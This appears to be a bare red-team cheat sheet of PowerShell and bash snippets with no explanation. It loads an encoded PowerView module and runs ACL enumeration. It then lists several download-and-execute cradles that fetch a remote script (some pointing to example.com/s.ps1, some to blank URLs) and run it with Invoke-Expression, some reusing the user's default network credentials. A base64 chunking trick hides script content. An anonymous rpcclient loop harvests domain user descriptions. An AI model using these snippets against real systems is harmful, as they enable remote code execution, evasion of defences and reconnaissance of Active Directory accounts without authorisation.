$encrypted = Get-Content "C:\Tools\PowerView.enc" -Raw
$bytes = [Convert]::FromBase64String($encrypted.Trim())
$moduleContent = [System.Text.Encoding]::UTF8.GetString($bytes)
New-Module -ScriptBlock ([ScriptBlock]::Create($moduleContent)) -Name PowerView


try {
    [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices") | Out-Null
    [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.AccountManagement") | Out-Null
    
    Write-Host "+"
} catch {
    Write-Host "-: $_"
}

Find-InterestingACL -ResolveGUIDs


$request = [System.Net.WebRequest]::Create('')
$response = $request.GetResponse()
$stream = $response.GetResponseStream()
$reader = New-Object System.IO.StreamReader($stream)
$content = $reader.ReadToEnd()
$reader.Close()
$response.Close()
Invoke-Expression $content

$r=[System.Net.WebRequest]::Create('');$s=$r.GetResponse().GetResponseStream();$d=New-Object System.IO.StreamReader($s);IEX $d.ReadToEnd();$d.Close()

$xmlhttp = New-Object -ComObject MSXML2.XMLHTTP
$xmlhttp.open("GET", '', $false)
$xmlhttp.send()
Invoke-Expression $xmlhttp.responseText


$wc=New-Object Net.WebClient;$wc.UseDefaultCredentials=$true;iex $wc.DownloadString("http:///.ps1")


$req=[System.Net.HttpWebRequest]::Create("http://example.com/s.ps1");$res=$req.GetResponse();$sr=New-Object IO.StreamReader($res.GetResponseStream());iex $sr.ReadToEnd();$sr.Close()

[System.AppDomain]::CurrentDomain.SetData("APP_CONFIG_FILE", $null);$wc=New-Object Net.WebClient;iex $wc.DownloadString("http://example.com/s.ps1")

$wc=New-Object System.Net.WebClient;$wc.Proxy=[System.Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;iex $wc.DownloadString("http://example.com/s.ps1")

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content .\script.ps1 -Raw)))
$part1 = $encoded.Substring(0, 8000)
$part2 = $encoded.Substring(8000)

powershell.exe -NoProfile -Command "`$code='$part1'+'$part2'; iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$code)))"


rpcclient -U "" <IP> -c "enumdomusers" \
| while read line; do
    user=$(echo $line | cut -d'[' -f2 | cut -d']' -f1)
    rid=$(echo $line | cut -d'[' -f4 | cut -d']' -f1)
    echo "=== $user ==="
    rpcclient -U "" <IP> -c "queryuser $rid" | grep -i description
done

